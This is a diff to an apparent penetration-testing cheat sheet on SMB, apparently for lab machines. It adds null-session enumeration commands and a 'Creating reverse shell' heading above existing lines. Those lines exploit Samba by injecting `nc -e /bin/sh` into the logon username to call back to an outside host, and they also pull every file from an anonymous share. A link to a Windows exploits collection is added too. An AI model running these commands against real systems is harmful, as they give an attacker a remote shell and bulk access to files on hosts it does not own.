@@ -1,3 +1,10 @@
+Checking Null sessions
+```bash
+smbmap -H 10.10.10.4
+smbclient -N -L //10.10.10.4
+```
+
+Creating reverse shell
 ```bash
 smbclient //10.10.10.3/tmp
 smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.24 443`"
@@ -13,3 +20,5 @@ smbclient //10.10.10.100/<share_name> -U ""%""
     PROMPT OFF
     mget *
 ```
+
+https://github.com/abatchy17/WindowsExploits
